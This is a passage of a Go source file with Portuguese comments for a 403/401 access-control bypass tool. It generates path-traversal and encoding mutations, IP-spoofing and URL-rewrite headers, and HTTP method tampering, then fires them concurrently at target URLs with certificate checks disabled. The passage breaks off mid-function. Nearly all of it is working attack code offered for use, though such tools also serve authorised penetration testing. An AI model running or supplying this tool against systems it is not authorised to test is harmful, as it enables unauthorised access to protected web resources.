// main.go
package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

const (
	DDS     = "dds"
	ENC     = "enc"
	QUICK   = "quick"
	CASE    = "case"
	HEADRS  = "headers"
	REWRITE = "rewrite"
	METHOD  = "method"
	ALL     = "all"
	RICH    = "rich" // novo: combina mutações avançadas para bypass
)

type Response struct {
	URL        string
	StatusCode int
	BodyLength int
	ExtraInfo  string
}

type Payload struct {
	URL          string
	ExtraHeaders map[string]string
	Method       string
	ExtraInfo    string
	Data         string
}

type Config struct {
	URLs        []string
	Techniques  []string
	Headers     []string
	Concurrency int
	Timeout     int
	OutputFile  string
	Verbose     bool
	All         bool
	Layer       int
	Full        bool

	// Novos controles de explosão
	Aggressive           bool // -aggr: combina mais mutações simultâneas
	MaxMutationsPerSeg   int  // -maxseg
	TraversalDepthPerGap int  // -tdepth
}

type multiFlag []string

func (f *multiFlag) String() string { return strings.Join(*f, ", ") }
func (f *multiFlag) Set(value string) error {
	*f = append(*f, value)
	return nil
}

func main() {
	singleURL := flag.String("u", "", "URL alvo única (deixe em branco para ler do stdin)")
	technique := flag.String("t", "", "Técnica: dds, enc, quick, case, headers, rewrite, method, rich, all")
	layer := flag.Int("l", 0, "Camada para aplicar modificações (1-indexado). Se não informado, usa a última camada.")
	fullFlag := flag.Bool("full", false, "Aplica modificações a todas as camadas")
	var headers multiFlag
	flag.Var(&headers, "H", "Cabeçalho(s) customizado(s) 'Name: Value' (multi)")

	concurrency := flag.Int("c", 10, "Requisições concorrentes")
	timeout := flag.Int("timeout", 10, "Timeout (s)")
	output := flag.String("o", "", "Arquivo de saída (opcional)")
	verbose := flag.Bool("v", false, "Verbose")
	allFlag := flag.Bool("all", false, "Testa mesmo sem 401/403 no check inicial")

	methodFlag := flag.String("X", "", "Método HTTP a utilizar")
	dataFlag := flag.String("d", "", "Dados para o body (JSON ou x-www-form-urlencoded)")

	// Novos flags
	aggr := flag.Bool("aggr", false, "Modo agressivo (mais combinações)")
	maxseg := flag.Int("maxseg", 64, "Máximo de mutações por segmento (limite para evitar explosão)")
	tdepth := flag.Int("tdepth", 2, "Profundidade de traversal por fronteira (ex: ../, ../../)")

	flag.Parse()

	cfg := Config{
		Headers:              headers,
		Concurrency:          *concurrency,
		Timeout:              *timeout,
		OutputFile:           *output,
		Verbose:              *verbose,
		All:                  *allFlag,
		Layer:                *layer,
		Full:                 *fullFlag,
		Aggressive:           *aggr,
		MaxMutationsPerSeg:   *maxseg,
		TraversalDepthPerGap: *tdepth,
	}

	if *technique == "" {
		cfg.Techniques = []string{DDS, ENC, QUICK, CASE, RICH}
	} else {
		cfg.Techniques = []string{*technique}
	}

	var urls []string
	if *singleURL != "" {
		urls = append(urls, *singleURL)
	} else {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			line := strings.TrimSpace(sc.Text())
			if line != "" {
				urls = append(urls, line)
			}
		}
		if err := sc.Err(); err != nil {
			fmt.Fprintf(os.Stderr, "Erro ao ler stdin: %v\n", err)
			os.Exit(1)
		}
	}
	if len(urls) == 0 {
		fmt.Println("Nenhuma URL alvo fornecida. Use -u ou stdin.")
		os.Exit(1)
	}
	cfg.URLs = urls

	toTest := filterByInitialCheck(cfg)
	allPayloads := buildAllRequests(cfg, toTest)

	// aplica -X / -d
	if *methodFlag != "" || *dataFlag != "" {
		for i := range allPayloads {
			if *methodFlag != "" {
				allPayloads[i].Method = *methodFlag
			}
			if *dataFlag != "" {
				allPayloads[i].Data = *dataFlag
			}
		}
	}

	results := runTests(allPayloads, cfg)

	sort.Slice(results, func(i, j int) bool {
		if results[i].StatusCode != results[j].StatusCode {
			return results[i].StatusCode < results[j].StatusCode
		}
		return results[i].BodyLength < results[j].BodyLength
	})

	if !cfg.Verbose {
		printAllResults(results, cfg)
	}
}

func filterByInitialCheck(cfg Config) []string {
	if cfg.All {
		return cfg.URLs
	}
	var keep []string
	client := &http.Client{
		Timeout: time.Duration(cfg.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, raw := range cfg.URLs {
		resp, err := client.Get(raw)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
			keep = append(keep, raw)
		}
	}
	// Fallback: se nada foi 401/403, testa mesmo assim
	if len(keep) == 0 {
		return cfg.URLs
	}
	return keep
}

func buildAllRequests(cfg Config, baseURLs []string) []Payload {
	var all []Payload
	for _, base := range baseURLs {
		parsed, err := url.Parse(base)
		if err != nil {
			fmt.Fprintf(os.Stderr, "URL inválida, ignorando: %s (erro: %v)\n", base, err)
			continue
		}
		for _, tech := range cfg.Techniques {
			var payloads []Payload
			switch tech {
			case DDS:
				payloads = wrapPayloads(generateDDSPayloads(parsed, cfg.Layer, cfg.Full), "dds")
			case ENC:
				payloads = wrapPayloads(generateEncodingPayloads(parsed, cfg.Layer, cfg.Full), "enc")
			case QUICK:
				payloads = wrapPayloads(generateQuickPayloads(parsed), "quick")
			case CASE:
				payloads = wrapPayloads(generateCasePayloads(parsed, cfg.Layer, cfg.Full), "case")
			case HEADRS:
				payloads = generateHeadersPayloads(parsed)
			case REWRITE:
				payloads = generateRewritePayloads(parsed)
			case METHOD:
				payloads = generateMethodPayloads(parsed)
			case RICH:
				payloads = wrapPayloads(generateRichBypassPayloads(parsed, cfg), "rich")
			case ALL:
				mix := [][]Payload{
					wrapPayloads(generateDDSPayloads(parsed, cfg.Layer, cfg.Full), "dds"),
					wrapPayloads(generateEncodingPayloads(parsed, cfg.Layer, cfg.Full), "enc"),
					wrapPayloads(generateQuickPayloads(parsed), "quick"),
					wrapPayloads(generateCasePayloads(parsed, cfg.Layer, cfg.Full), "case"),
					generateHeadersPayloads(parsed),
					generateRewritePayloads(parsed),
					generateMethodPayloads(parsed),
					wrapPayloads(generateRichBypassPayloads(parsed, cfg), "rich"),
				}
				for _, m := range mix {
					payloads = append(payloads, m...)
				}
			}
			all = append(all, payloads...)
		}
	}
	return removeDuplicatePayloads(all)
}

func wrapPayloads(urls []string, extra string) []Payload {
	var ps []Payload
	for _, u := range urls {
		ps = append(ps, Payload{
			URL:          u,
			ExtraHeaders: map[string]string{},
			Method:       "GET",
			ExtraInfo:    extra,
		})
	}
	return ps
}

func removeDuplicatePayloads(pls []Payload) []Payload {
	seen := make(map[string]struct{}, len(pls)*2)
	out := make([]Payload, 0, len(pls))
	for _, p := range pls {
		key := p.Method + " " + p.URL + " " + p.ExtraInfo + " " + headersKey(p.ExtraHeaders)
		if _, ok := seen[key]; !ok {
			seen[key] = struct{}{}
			out = append(out, p)
		}
	}
	return out
}

func headersKey(h map[string]string) string {
	if len(h) == 0 {
		return ""
	}
	// ordem determinística
	keys := make([]string, 0, len(h))
	for k := range h {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	sb := strings.Builder{}
	for _, k := range keys {
		sb.WriteString(k)
		sb.WriteString("=")
		sb.WriteString(h[k])
		sb.WriteString(";")
	}
	return sb.String()
}

func runTests(payloads []Payload, cfg Config) []Response {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(cfg.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// deixa seguir (útil pra ver se 30x vira 200)
			return nil
		},
	}

	resultsChan := make(chan Response, len(payloads))
	sem := make(chan struct{}, cfg.Concurrency)
	var wg sync.WaitGroup

	for _, p := range payloads {
		wg.Add(1)
		sem <- struct{}{}
		go func(pl Payload) {
			defer wg.Done()
			defer func() { <-sem }()
			method := pl.Method
			if method == "" {
				method = "GET"
			}
			var body io.Reader
			if pl.Data != "" {
				body = strings.NewReader(pl.Data)
			}
			req, err := http.NewRequest(method, pl.URL, body)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, StatusCode: 0, BodyLength: 0, ExtraInfo: pl.ExtraInfo}
				return
			}

			// heurística Content-Type
			if pl.Data != "" && req.Header.Get("Content-Type") == "" {
				t := strings.TrimSpace(pl.Data)
				if strings.HasPrefix(t, "{") && strings.HasSuffix(t, "}") {
					req.Header.Set("Content-Type", "application/json")
				} else {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			}

			req.Header.Set("User-Agent", "Mozilla/5.0")
			req.Header.Set("Accept", "*/*")

			for _, h := range cfg.Headers {
				parts := strings.SplitN(h, ":", 2)
				if len(parts) == 2 {
					req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
				}
			}
			for k, v := range pl.ExtraHeaders {
				req.Header.Set(k, v)
			}

			resp, err := client.Do(req)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, StatusCode: 0, BodyLength: 0, ExtraInfo: pl.ExtraInfo}
				return
			}
			defer resp.Body.Close()
			b, _ := io.ReadAll(resp.Body)
			resultsChan <- Response{
				URL:        pl.URL,
				StatusCode: resp.StatusCode,
				BodyLength: len(b),
				ExtraInfo:  pl.ExtraInfo,
			}
		}(p)
	}

	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	var results []Response
	if cfg.Verbose {
		w := bufio.NewWriter(os.Stdout)
		for r := range resultsChan {
			results = append(results, r)
			printResponse(w, r)
		}
		w.Flush()
	} else {
		for r := range resultsChan {
			results = append(results, r)
		}
	}
	return results
}

func printResponse(writer *bufio.Writer, r Response) {
	line := fmt.Sprintf("%s - Status: %d - Length: %d", r.URL, r.StatusCode, r.BodyLength)
	if r.ExtraInfo != "" {
		line += " - " + r.ExtraInfo
	}
	writer.WriteString(colorizeLine(line, r.StatusCode) + "\n")
}

func printAllResults(results []Response, config Config) {
	// Bucket por BodyLength
	buckets := make(map[int][]Response)
	for _, r := range results {
		buckets[r.BodyLength] = append(buckets[r.BodyLength], r)
	}

	// Ordena os grupos por quantidade (desc) e desempata por Length (asc)
	lengths := make([]int, 0, len(buckets))
	for l := range buckets {
		lengths = append(lengths, l)
	}
	sort.Slice(lengths, func(i, j int) bool {
		ci, cj := len(buckets[lengths[i]]), len(buckets[lengths[j]])
		if ci != cj {
			return ci > cj // mais resultados primeiro
		}
		return lengths[i] < lengths[j]
	})

	var file *os.File
	var err error
	if config.OutputFile != "" {
		file, err = os.Create(config.OutputFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erro ao criar arquivo de saída: %v\n", err)
			os.Exit(1)
		}
		defer file.Close()
	}

	w := bufio.NewWriter(os.Stdout)
	defer w.Flush()

	for _, length := range lengths {
		group := buckets[length]

		// Ordena dentro do grupo (Status asc, depois URL)
		sort.Slice(group, func(i, j int) bool {
			if group[i].StatusCode != group[j].StatusCode {
				return group[i].StatusCode < group[j].StatusCode
			}
			return group[i].URL < group[j].URL
		})

		// Título do grupo
		title := fmt.Sprintf("\n\033[1m=== Length: %d (%d resultados) ===\033[0m\n", length, len(group))
		w.WriteString(title)
		if file != nil {
			_, _ = file.WriteString(fmt.Sprintf("\n=== Length: %d (%d resultados) ===\n", length, len(group)))
		}

		// Items
		for _, res := range group {
			printResponse(w, res)

			if file != nil {
				line := fmt.Sprintf("%s - Status: %d - Length: %d", res.URL, res.StatusCode, res.BodyLength)
				if res.ExtraInfo != "" {
					line += " - " + res.ExtraInfo
				}
				_, _ = file.WriteString(line + "\n")
			}
		}
	}
}

// ------------------ Geradores originais (mantidos) ------------------

func generateDDSPayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path := strings.TrimPrefix(parsedURL.Path, "/")
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	variations := []string{
		"..//", "./", ".././", ".../", "..../", ".;/", "..;/", "..;", ";",
		"%2e%2e/", "%2e%2e%2f", "..%2f", "..%2F", ".%2e/", "%2e./",
		"%252e%252e/", "%252e%252e%252f", "..//", "..\\", "..%5c", "..%255c",
		"..%c0%af", "%2e%2e%c0%af", "%252e%252e%c0%af", "..%c1%9c",
		"..%00/", "..%0d/", "..%0a/", "..%ff/", "%2e%2e%5c", "%2e/", "%3f",
		"%26", "%23", "%2c", "%7c", "%2e%2e%2f%2e%2e%2f",
		"%2f..%2f..", "%5c..%5c..", "....//", "..//..", "....//..//..",
		"./..//", "%u221e", "%u002e%u002e", "....", "..%2e/",
		".%00./", ".%0d./", ".%0a./", ".%2e./", ".%2f./", ".\\/ ",
		"%u2215", "%uff0f", "%c0%af", "%252f", "%5c", "%2f",
		"..\\.\\", "....\\", "..\\..\\",
	}

	if full {
		for i := 0; i < len(pathParts); i++ {
			cur := strings.Join(pathParts[:i+1], "/")
			for _, v := range variations {
				payloads = append(payloads, fmt.Sprintf("%s/%s%s", base, cur, v))
				mod := append([]string{}, pathParts[:i+1]...)
				mod[i] = v + mod[i]
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
			}
		}
		for _, v := range variations {
			for i := 1; i < len(pathParts); i++ {
				mod := append([]string{}, pathParts...)
				mod[i] = v + mod[i]
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
			}
		}
		payloads = append(payloads, prefixSemicolons(base, pathParts)...)
	} else {
		target := len(pathParts) - 1
		if layer > 0 && layer <= len(pathParts) {
			target = layer - 1
		}
		cur := strings.Join(pathParts[:target+1], "/")
		for _, v := range variations {
			payloads = append(payloads, fmt.Sprintf("%s/%s%s", base, cur, v))
			mod := append([]string{}, pathParts[:target+1]...)
			mod[target] = v + mod[target]
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
		payloads = append(payloads, prefixSemicolons(base, pathParts)...)
	}

	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

func prefixSemicolons(base string, parts []string) []string {
	var out []string
	semicolonCombos := generateSemicolonCombinations(parts)
	out = append(out, joinBase(base, semicolonCombos)...)
	if len(parts) >= 2 {
		multi := generateMultipleSemicolonPatterns(parts)
		out = append(out, joinBase(base, multi)...)
	}
	return out
}

func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path := strings.TrimPrefix(parsedURL.Path, "/")
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// encodings do PATH inteiro
	encodedPath := url.PathEscape(path)
	doubleEncodedPath := url.PathEscape(encodedPath)
	b64Path := base64.StdEncoding.EncodeToString([]byte(path))
	b64URLPath := base64.URLEncoding.EncodeToString([]byte(path))
	payloads = append(payloads,
		fmt.Sprintf("%s/%s", base, encodedPath),
		fmt.Sprintf("%s/%s", base, doubleEncodedPath),
		fmt.Sprintf("%s/%s", base, b64Path),
		fmt.Sprintf("%s/%s", base, b64URLPath),
	)

	// quais segmentos vamos modificar
	var idxs []int
	if full {
		for i := range pathParts {
			idxs = append(idxs, i)
		}
	} else {
		target := len(pathParts) - 1
		if layer > 0 && layer <= len(pathParts) {
			target = layer - 1
		}
		idxs = []int{target}
	}

	for _, i := range idxs {
		seg := pathParts[i]

		// (a) encodings "completos" do segmento (inclui b64 std e url-safe)
		fullEncs := generateFullEncodings(seg)
		for _, fe := range fullEncs {
			mod := append([]string{}, pathParts...)
			mod[i] = fe
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}

		// (b) percent-encoding por caractere (uma letra por vez)
		for _, cbc := range percentEncodeCharByChar(seg) {
			mod := append([]string{}, pathParts...)
			mod[i] = cbc
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}

		// (c) b64 do segmento inteiro (explícito)
		{
			mod := append([]string{}, pathParts...)
			mod[i] = base64.StdEncoding.EncodeToString([]byte(seg))
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
		{
			mod := append([]string{}, pathParts...)
			mod[i] = base64.URLEncoding.EncodeToString([]byte(seg))
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}

		// (d) b64 char-a-char (concatena b64 de cada letra)
		if seg != "" {
			var b64Chars []string
			for _, ch := range seg {
				b64Chars = append(b64Chars, base64.StdEncoding.EncodeToString([]byte(string(ch))))
			}
			mod := append([]string{}, pathParts...)
			mod[i] = strings.Join(b64Chars, "")
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
	}

	// preserva query string
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

func generateQuickPayloads(parsedURL *url.URL) []string {
	var payloads []string
	path := strings.TrimPrefix(parsedURL.Path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
	quick := []string{
		"//" + path,
		"/./" + path,
		"/.///" + path,
		"/.%2f" + path,
		"/;/" + path,
		"/.;/" + path,
		"//;" + path,
		"/%2f/" + path,
		"/./" + path + "/.",
		"//" + path + "//",
		"/" + path + "//",
		"/" + path + "/./",
		"/" + path + "%20",
		"/" + path + "%09",
		"/" + path + "%00",
		"/" + path + "..;/",
		"/" + path + "/;/",
		"/" + path + "//;/",
		"/" + path + "/./;/",
		"/%2e/" + path,
		"/%252e/" + path,
		"/%252e%252e/" + path,
		"/%2f/" + path,
		"/%2f%2f/" + path,
		"/%2f;" + path,
		"/%3b/" + path,
		"/%23/" + path,
		"/%2e%2e/" + path,
		"/..%2f" + path,
		"/%2f..%2f" + path,
	}
	for _, p := range quick {
		payloads = append(payloads, base+p)
	}
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

func generateCasePayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path := strings.TrimPrefix(parsedURL.Path, "/")
	parts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	var idxs []int
	if full {
		for i := range parts {
			idxs = append(idxs, i)
		}
	} else {
		target := len(parts) - 1
		if layer > 0 && layer <= len(parts) {
			target = layer - 1
		}
		idxs = []int{target}
	}
	for _, i := range idxs {
		if parts[i] == "" {
			continue
		}
		variations := []string{
			strings.ToUpper(parts[i]),
			strings.ToLower(parts[i]),
			strings.Title(strings.ToLower(parts[i])),
		}
		if len(parts[i]) > 1 {
			variations = append(variations,
				strings.ToUpper(parts[i][:1])+parts[i][1:],
				strings.ToLower(parts[i][:1])+parts[i][1:],
			)
		}
		// alternado
		mixed := ""
		for j, ch := range parts[i] {
			if j%2 == 0 {
				mixed += strings.ToUpper(string(ch))
			} else {
				mixed += strings.ToLower(string(ch))
			}
		}
		variations = append(variations, mixed)

		for _, v := range variations {
			mod := append([]string{}, parts...)
			mod[i] = v
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
	}
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

// ------------------ NOVO: rich/avançado ------------------

func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
	base := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	path := strings.TrimPrefix(u.Path, "/")
	parts := strings.Split(path, "/")

	set := make(map[string]struct{}, 2048)

	// 1) control chars URL-encoded na frente de cada segmento
	controlPrefixes := []string{
		"%00", "%09", "%0a", "%0d", "%20", "%23", "%26", "%2b", "%2c", "%3b",
		"%2f", "%5c", "%2e", "%2e%2f", "%2f%2e", "%2e%2e%2f", "%2f%2e%2e", "%252e%252e%252f",
	}
	for i := range parts {
		orig := parts[i]
		if orig == "" {
			continue
		}
		for _, pre := range controlPrefixes {
			mod := append([]string{}, parts...)
			mod[i] = pre + orig
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 2) traversal nas fronteiras
	traversals := []string{
		"../", "..;/", "/..;/", ";../", "%2e%2e/", "%2e./", "..%2f", "%2f..%2f", "/.%2e/", "/%2e%2e/",
	}
	if cfg.TraversalDepthPerGap < 1 {
		cfg.TraversalDepthPerGap = 1
	}
	for gap := 0; gap <= len(parts); gap++ {
		for _, t := range traversals {
			for d := 1; d <= cfg.TraversalDepthPerGap; d++ {
				token := strings.Repeat(t, d)
				left := strings.Join(parts[:gap], "/")
				right := strings.Join(parts[gap:], "/")
				var p string
				switch {
				case left == "" && right == "":
					p = token
				case left == "":
					p = token + right
				case right == "":
					p = left + "/" + token
				default:
					p = left + "/" + token + right
				}
				add(set, base, p, u.RawQuery)
			}
		}
	}

	// 3) duplicação "suja" do segmento (ex: admin..%2fadmin)
	dupSep := []string{"..%2f", "%2f", ";", "%3b", "%2f..%2f", "%2e%2e%2f"}
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		for _, sep := range dupSep {
			mod := append([]string{}, parts...)
			mod[i] = seg + sep + seg
			addPath(set, base, mod, u.RawQuery)
		}
		for _, sep := range []string{";..%2f..;", ";/%2e%2e/;"} {
			mod := append([]string{}, parts...)
			mod[i] = seg + sep + seg
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 4) percent-encoding por caractere
	hexUpper := func(b byte) string { return fmt.Sprintf("%%%02X", b) }
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}

		// segmento inteiro codificado (1x e 2x)
		{
			mod := append([]string{}, parts...)
			mod[i] = url.PathEscape(seg)
			addPath(set, base, mod, u.RawQuery)
		}
		{
			mod := append([]string{}, parts...)
			mod[i] = url.PathEscape(url.PathEscape(seg))
			addPath(set, base, mod, u.RawQuery)
		}

		// 1 char codificado
		count := 0
		for pos := 0; pos < len(seg); pos++ {
			enc := seg[:pos] + hexUpper(seg[pos]) + seg[pos+1:]
			mod := append([]string{}, parts...)
			mod[i] = enc
			addPath(set, base, mod, u.RawQuery)
			count++
			if !cfg.Aggressive && count >= cfg.MaxMutationsPerSeg {
				break
			}
		}

		// 2 chars codificados (apenas em -aggr)
		if cfg.Aggressive {
			lim := 0
			for a := 0; a < len(seg); a++ {
				for b := a + 1; b < len(seg); b++ {
					enc := seg[:a] + hexUpper(seg[a]) + seg[a+1:b] + hexUpper(seg[b]) + seg[b+1:]
					mod := append([]string{}, parts...)
					mod[i] = enc
					addPath(set, base, mod, u.RawQuery)
					lim++
					if lim >= cfg.MaxMutationsPerSeg {
						break
					}
				}
				if lim >= cfg.MaxMutationsPerSeg {
					break
				}
			}
		}

		// 4b) base64 por caractere (apenas em -aggr)
		if cfg.Aggressive {
			var pieces []string
			for _, ch := range seg {
				pieces = append(pieces, base64.StdEncoding.EncodeToString([]byte(string(ch))))
			}
			mod := append([]string{}, parts...)
			mod[i] = strings.Join(pieces, "")
			addPath(set, base, mod, u.RawQuery)
		}

		// 4c) base64 do segmento inteiro (std + url-safe)
		{
			mod := append([]string{}, parts...)
			mod[i] = base64.StdEncoding.EncodeToString([]byte(seg))
			addPath(set, base, mod, u.RawQuery)
		}
		{
			mod := append([]string{}, parts...)
			mod[i] = base64.URLEncoding.EncodeToString([]byte(seg))
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 5) case-mangling + (já cobrimos b64 acima)
	for i := range parts {
		seg := parts[i]
		if seg == "" {
			continue
		}
		vars := []string{
			strings.ToUpper(seg),
			strings.ToLower(seg),
			strings.Title(strings.ToLower(seg)),
		}
		// alternado
		mixed := ""
		for j, ch := range seg {
			if j%2 == 0 {
				mixed += strings.ToUpper(string(ch))
			} else {
				mixed += strings.ToLower(string(ch))
			}
		}
		vars = append(vars, mixed)

		for _, v := range vars {
			mod := append([]string{}, parts...)
			mod[i] = v
			addPath(set, base, mod, u.RawQuery)
		}
	}

	// 6) slashes “esquisitos” entre segmentos
	altSlashes := []string{"%2f", "%252f", "%5c", "%255c", "%c0%af", "%e2%81%84", "%u2215"}
	for i := 1; i < len(parts); i++ {
		for _, slash := range altSlashes {
			left := strings.Join(parts[:i], "/")
			right := strings.Join(parts[i:], "/")
			add(set, base, left+slash+right, u.RawQuery)
		}
	}

	// 7) semicolons espalhados
	addMany(set, joinBase(base, generateMultipleSemicolonPatterns(parts)), u.RawQuery)

	// retorno ordenado
	out := make([]string, 0, len(set))
	for s := range set {
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

func add(set map[string]struct{}, base, p, rawq string) {
	u := base + "/" + strings.TrimPrefix(p, "/")
	if rawq != "" {
		u += "?" + rawq
	}
	set[u] = struct{}{}
}

func addPath(set map[string]struct{}, base string, parts []string, rawq string) {
	add(set, base, strings.Join(parts, "/"), rawq)
}

func joinBase(base string, rel []string) []string {
	out := make([]string, 0, len(rel))
	for _, r := range rel {
		out = append(out, base+"/"+strings.TrimPrefix(r, "/"))
	}
	return out
}

func addMany(set map[string]struct{}, urls []string, rawq string) {
	for _, u := range urls {
		if rawq != "" {
			u = u + "?" + rawq
		}
		set[u] = struct{}{}
	}
}

// ------------------ Headers / Rewrite / Methods ------------------

func generateHeadersPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()
	host := parsedURL.Host
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	headerSets := []map[string]string{
		// IP spoof / trust
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Forwarded-For": "10.0.0.1"},
		{"X-Forwarded-For": "192.168.0.1"},
		{"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
		{"X-Real-IP": "127.0.0.1"},
		{"True-Client-IP": "127.0.0.1"},
		{"X-Client-Ip": "127.0.0.1"},
		{"X-Original-Client-IP": "127.0.0.1"},
		{"X-Custom-IP-Authorization": "127.0.0.1"},

		// Proto / TLS hints
		{"X-Forwarded-Proto": "https"},
		{"X-Forwarded-Proto": "http"},
		{"Front-End-Https": "on"},
		{"X-Forwarded-Port": "443"},

		// Host tricks (pode ser intrusivo, mas útil em bypass)
		{"Host": "127.0.0.1"},
		{"Host": "localhost"},
		{"X-Forwarded-Host": "127.0.0.1"},
		{"X-Forwarded-Host": host},
		{"X-Host": "127.0.0.1"},
		{"X-Original-Host": host},

		// Rewrite/Original URL headers
		{"X-Original-URL": path},
		{"X-Original-URI": path},
		{"X-Request-URI": path},
		{"X-Rewrite-URL": path},
		{"X-Rewrite-Uri": path},
		{"X-Forwarded-Uri": path},
		{"X-Accel-Redirect": path},

		// Method override
		{"X-HTTP-Method-Override": "DELETE"},
		{"X-HTTP-Method-Override": "PUT"},
		{"X-Method-Override": "DELETE"},
		{"X-HTTP-Method": "DELETE"},
	}

	for _, hs := range headerSets {
		info := headerInfo(hs)
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: hs,
			Method:       "GET",
			ExtraInfo:    "Header: " + info,
		})
	}
	return payloads
}

func headerInfo(h map[string]string) string {
	parts := make([]string, 0, len(h))
	keys := make([]string, 0, len(h))
	for k := range h {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		parts = append(parts, fmt.Sprintf("%s: %s", k, h[k]))
	}
	return strings.Join(parts, ", ")
}

func generateRewritePayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	originalPath := parsedURL.Path
	if originalPath == "" {
		originalPath = "/"
	}
	baseURL := fmt.Sprintf("%s://%s/", parsedURL.Scheme, parsedURL.Host)
	rewriteHeaders := []string{"X-Rewrite-Url", "X-Original-URL", "X-Custom-URL", "X-Rewrite-URL", "X-Original-URI", "X-Request-URI"}
	alts := []string{
		originalPath,
		originalPath + "/.",
		"/%2e" + originalPath,
		"/..;" + originalPath,
	}
	for _, hk := range rewriteHeaders {
		for _, val := range alts {
			payloads = append(payloads, Payload{
				URL:          baseURL,
				ExtraHeaders: map[string]string{hk: val},
				Method:       "GET",
				ExtraInfo:    fmt.Sprintf("Header: %s: %s", hk, val),
			})
		}
	}
	return payloads
}

func generateMethodPayloads(parsedURL *url.URL) []Payload {
	var payloads []Payload
	orig := parsedURL.String()
	methods := []string{
		"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
		// WebDAV/raros
		"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "SEARCH",
		// alguns servidores aceitam TRACE/DEBUG
		"TRACE", "DEBUG",
	}
	for _, m := range methods {
		payloads = append(payloads, Payload{
			URL:          orig,
			ExtraHeaders: map[string]string{},
			Method:       m,
			ExtraInfo:    fmt.Sprintf("Method: %s", m),
		})
	}
	// Overrides via query (comuns em frameworks)
	qOverrides := []string{"_method=DELETE", "_method=PUT", "method=DELETE"}
	for _, qo := range qOverrides {
		u := *parsedURL
		if u.RawQuery == "" {
			u.RawQuery = qo
		} else {
			u.RawQuery = u.RawQuery + "&" + qo
		}
		payloads = append(payloads, Payload{
			URL:          u.String(),
			Method:       "POST",
			ExtraHeaders: map[string]string{"Content-Length": "0"},
			ExtraInfo:    "Method override via query",
		})
	}
	return payloads
}

// ------------------ Utilitários de geração ------------------

func generateMultipleSemicolonPatterns(pathParts []string) []string {
	var patterns []string
	for i := 0; i < len(pathParts)-1; i++ {
		parts := append([]string{}, pathParts...)
		parts[i] = parts[i] + ";"
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	parts := append([]string{}, pathParts...)
	parts[len(parts)-1] = parts[len(parts)-1] + ";"
	patterns = append(patterns, strings.Join(parts, "/"))

	for i := 1; i < len(pathParts); i++ {
		parts := append([]string{}, pathParts...)
		parts[i] = ";" + parts[i]
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts)-1; i++ {
		parts := append([]string{}, pathParts...)
